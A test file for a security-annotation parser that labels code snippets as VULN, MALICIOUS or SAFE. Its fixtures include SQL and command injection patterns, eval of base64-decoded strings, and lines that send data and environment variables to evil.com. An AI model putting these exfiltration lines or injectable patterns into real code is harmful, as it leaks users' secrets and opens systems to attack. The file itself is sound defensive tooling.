import { describe, it, expect } from 'bun:test';
import { parseAnnotations } from './annotation-parser.js';

describe('parseAnnotations', () => {
  describe('VULN annotations', () => {
    it('parses VULN with CWE and severity', () => {
      const code = `// codesure: VULN CWE-89 HIGH\ndb.query("SELECT * FROM users WHERE id = " + userId);`;
      const annotations = parseAnnotations(code);
      expect(annotations).toHaveLength(1);
      expect(annotations[0].type).toBe('VULN');
      expect(annotations[0].cwe).toBe('CWE-89');
      expect(annotations[0].severity).toBe('HIGH');
      expect(annotations[0].line).toBe(2);
    });

    it('parses VULN CRITICAL severity', () => {
      const code = `// codesure: VULN CWE-78 CRITICAL\nexec('ls ' + req.query.dir, callback);`;
      const annotations = parseAnnotations(code);
      expect(annotations[0].severity).toBe('CRITICAL');
    });

    it('parses VULN MEDIUM severity', () => {
      const code = `// codesure: VULN CWE-330 MEDIUM\nconst token = Math.random().toString(36);`;
      const annotations = parseAnnotations(code);
      expect(annotations[0].severity).toBe('MEDIUM');
    });

    it('parses Python-style VULN annotation', () => {
      const code = `# codesure: VULN CWE-89 HIGH\ncursor.execute("SELECT * FROM users WHERE id = " + str(user_id))`;
      const annotations = parseAnnotations(code);
      expect(annotations).toHaveLength(1);
      expect(annotations[0].type).toBe('VULN');
      expect(annotations[0].cwe).toBe('CWE-89');
      expect(annotations[0].line).toBe(2);
    });
  });

  describe('MALICIOUS annotations', () => {
    it('parses MALICIOUS with variant', () => {
      const code = `// codesure: MALICIOUS exfiltration\nfetch('https://evil.com/collect?d=' + btoa(data));`;
      const annotations = parseAnnotations(code);
      expect(annotations).toHaveLength(1);
      expect(annotations[0].type).toBe('MALICIOUS');
      expect(annotations[0].variant).toBe('exfiltration');
      expect(annotations[0].line).toBe(2);
    });

    it('parses MALICIOUS obfuscation variant', () => {
      const code = `// codesure: MALICIOUS obfuscation\neval(atob('YWxlcnQoMSk='));`;
      const annotations = parseAnnotations(code);
      expect(annotations[0].variant).toBe('obfuscation');
    });

    it('parses MALICIOUS execution variant', () => {
      const code = `// codesure: MALICIOUS execution\nconst fn = new Function('return ' + userInput)();`;
      const annotations = parseAnnotations(code);
      expect(annotations[0].variant).toBe('execution');
    });

    it('parses Python-style MALICIOUS annotation', () => {
      const code = `# codesure: MALICIOUS exfiltration\nrequests.post('https://evil.com', data=os.environ)`;
      const annotations = parseAnnotations(code);
      expect(annotations[0].type).toBe('MALICIOUS');
    });
  });

  describe('SAFE annotations', () => {
    it('parses SAFE annotation', () => {
      const code = `// codesure: SAFE\ndb.query("SELECT * FROM users WHERE id = ?", [userId]);`;
      const annotations = parseAnnotations(code);
      expect(annotations).toHaveLength(1);
      expect(annotations[0].type).toBe('SAFE');
      expect(annotations[0].line).toBe(2);
    });

    it('parses Python-style SAFE annotation', () => {
      const code = `# codesure: SAFE\nresult = subprocess.run(['ls', '-la'], shell=False)`;
      const annotations = parseAnnotations(code);
      expect(annotations[0].type).toBe('SAFE');
    });
  });

  describe('multiple annotations in one file', () => {
    it('parses both VULN and SAFE annotations', () => {
      const code = [
        '// codesure: VULN CWE-89 HIGH',
        'const query = "SELECT * FROM users WHERE name = \'" + req.body.name + "\'";',
        'db.query(query);',
        '// codesure: SAFE',
        'db.query("SELECT * FROM users WHERE name = ?", [req.body.name]);',
      ].join('\n');
      const annotations = parseAnnotations(code);
      expect(annotations).toHaveLength(2);
      expect(annotations[0].type).toBe('VULN');
      expect(annotations[0].line).toBe(2);
      expect(annotations[1].type).toBe('SAFE');
      expect(annotations[1].line).toBe(5);
    });

    it('parses multiple MALICIOUS annotations', () => {
      const code = [
        '// codesure: MALICIOUS obfuscation',
        "eval(atob('YWxlcnQoMSk='));",
        '// codesure: MALICIOUS obfuscation',
        "eval(Buffer.from('Y29uc29sZS5sb2coJ3B3bmVkJyk=', 'base64').toString());",
      ].join('\n');
      const annotations = parseAnnotations(code);
      expect(annotations).toHaveLength(2);
      expect(annotations[0].line).toBe(2);
      expect(annotations[1].line).toBe(4);
    });
  });

  describe('line number accuracy', () => {
    it('records line number of annotated code (line after annotation)', () => {
      const code = 'line1\nline2\n// codesure: SAFE\nline4';
      const annotations = parseAnnotations(code);
      expect(annotations[0].line).toBe(4);
    });
  });

  describe('edge cases', () => {
    it('returns empty array for code with no annotations', () => {
      const code = 'const x = 1;\nconst y = 2;';
      expect(parseAnnotations(code)).toHaveLength(0);
    });

    it('ignores non-codesure comments', () => {
      const code = '// TODO: fix this\nconst x = eval(input);';
      expect(parseAnnotations(code)).toHaveLength(0);
    });
  });
});
